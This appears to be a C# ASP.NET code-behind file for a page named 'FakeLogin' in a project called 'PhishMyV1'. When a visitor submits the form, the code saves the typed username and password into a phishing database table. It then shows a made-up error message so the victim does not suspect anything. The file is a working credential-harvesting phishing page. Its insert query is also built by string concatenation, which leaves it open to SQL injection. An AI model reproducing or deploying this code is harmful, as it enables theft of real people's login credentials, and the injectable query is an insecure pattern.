using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.UI.HtmlControls;
using System.Data.SqlClient;

namespace PhishMyV1
{
    public partial class FakeLogin : System.Web.UI.Page
    {
        SqlConnection con=new SqlConnection(@"Data Source=...;Initial Catalog=PhishDB;Integrated Security=True");
        protected void Page_Load(object sender, EventArgs e)
        {

        }

        protected void btnLogin_Click(object sender, EventArgs e)
        {
            try {
                //start code from here
                con.Open();
                SqlCommand cmd = con.CreateCommand();
                cmd.CommandType = System.Data.CommandType.Text;
                cmd.CommandText = "insert into PhishCh values('" + txtUsername.Text + "','" + txtPassword.Text + "')";
                cmd.ExecuteNonQuery();

                con.Close();
                ScriptManager.RegisterStartupScript(this, this.GetType(), "popup", "alert('We were not able to complete your request, try again tomorrow');", true);
            }
            catch (Exception ex) {

            Response.Write("We were not able to complete your request, try again tomorrow" + ex.Message);
            
            }

        }
    }
}